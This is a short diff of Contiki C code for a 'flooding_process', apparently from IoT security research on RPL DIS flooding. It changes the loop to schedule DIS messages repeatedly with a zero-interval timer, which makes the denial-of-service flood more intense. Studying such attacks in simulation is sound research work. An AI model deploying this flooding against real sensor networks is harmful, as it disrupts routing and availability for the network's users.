@@ -53,16 +53,16 @@ PROCESS_THREAD(flooding_process, ev, data)
   static struct etimer timer;
   PROCESS_BEGIN();
   
-  flooding = true; //flooding mode on
-
+  start_flooding();
   etimer_set(&timer, SEND_INTERVAL);
   while(1) {
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
     if (flooding) {
         /* Launch attack */
-        launch_flooding_attack();
+        //launch_flooding_attack();
+        rpl_timers_schedule_periodic_dis();
         printf("DIS packets sent: %d\n",dis_sent_flood);
-        etimer_reset_with_new_interval(&timer, CLOCK_SECOND);
+        etimer_reset_with_new_interval(&timer, 0);
     }
   }
   PROCESS_END();
